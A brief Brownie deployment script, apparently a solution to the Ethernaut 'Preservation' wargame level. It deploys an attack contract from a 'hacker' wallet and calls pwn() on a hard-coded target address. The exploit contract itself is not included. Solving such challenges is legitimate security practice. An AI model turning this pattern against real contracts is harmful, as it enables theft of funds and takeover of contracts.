from brownie import accounts, AttackPreservation, config


def main():
    contract = '0x6D014a985DaED9Cb330cd2745ddf710eE67a9685'
    hacker = accounts.add(config['wallets']['from_key'])

    attack_contract = AttackPreservation.deploy({'from': hacker})
    attack_contract.pwn(contract)

    